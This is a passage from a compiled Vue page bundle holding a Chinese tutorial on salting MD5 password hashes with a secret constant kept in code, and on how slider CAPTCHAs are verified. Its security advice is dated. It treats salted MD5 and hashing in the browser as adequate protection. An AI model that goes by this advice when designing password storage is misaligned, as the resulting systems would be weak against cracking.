还是相同的套路，反推所需要的数据量还是相同的，还是可以通过彩虹表反推")])]),t._v(" "),a("li",[a("p",[t._v("只加盐，不加中间字段好不好：")])])]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("md5(salt+'abced@#4@%#$7'+password)\n改为\nmd5(salt+password)\n")])])]),a("p",[t._v("不好，因为盐也是存放在数据库中的，而中间字段是存放在程序中的，如果数据库泄露，盐也会泄露，则造成规则的泄露，如果加了中间字段，不容易泄露规则")]),t._v(" "),a("ul",[a("li",[t._v("中间字符作用：如上所示，是增加密码复杂度，避免数据库泄露盐泄露就会泄露密码")]),t._v(" "),a("li",[t._v("盐泄露是否会泄露密码：如果有中间字段，则不会泄露")]),t._v(" "),a("li",[t._v("密码很复杂还需要保证密码的复杂性吗（即+盐和密码字段等）：要，为了防止数据库和程序的泄露")]),t._v(" "),a("li",[t._v("浏览器的表单密码在传输给后台时就 md5 或 sha1 加密有必要吗：有，可以增加犯罪成本，防止在传输过程中以明文传输时被破解")])]),t._v(" "),a("h3",{attrs:{id:"_2-人机验证和验证码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-人机验证和验证码"}},[t._v("#")]),t._v(" 2.人机验证和验证码")]),t._v(" "),a("p",[a("a",{attrs:{href:"https://www.lisa33xiaoq.net/1232.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("滑动验证码原理"),a("OutboundLink")],1)]),t._v(" "),a("p",[t._v("滑动验证码实现原理：")]),t._v(" "),a("ul",[a("li",[t._v("服务端随机生成抠图和带有抠图阴影的背景图片，服务端保存位置坐标")]),t._v(" "),a("li",[t._v("前端实现滑动交互（人机验证），将抠图拼在抠图阴影上，获取到用户滑动距离值")]),t._v(" "),a("li",[t._v("前端将用户滑动距离值传入服务端，服务端校验误差是否在容许范围内")]),t._v(" "),a("li",[t._v("这个过程中还存在风控服务器，处理风险：滑动行为（滑动时间是否过快不合理？判断为非人为操作）；页面行为（页面都没打开就已经滑动成功？判断为非人为操作）")])]),t._v(" "),a("comment"),t._v(" "),a("comment"),t._v(" "),a("comment"),t._v(" "),a("comment"),t._v(" "),a("comment"),t._v(" "),a("comment"),t._v(" "),a("comment"),t._v(" "),a("comment"),t._v(" "),a("comment"),t._v(" "),a("comment"),t._v(" "),a("comment")],1)}),[],!1,null,null,null);s.default=e.exports}}]);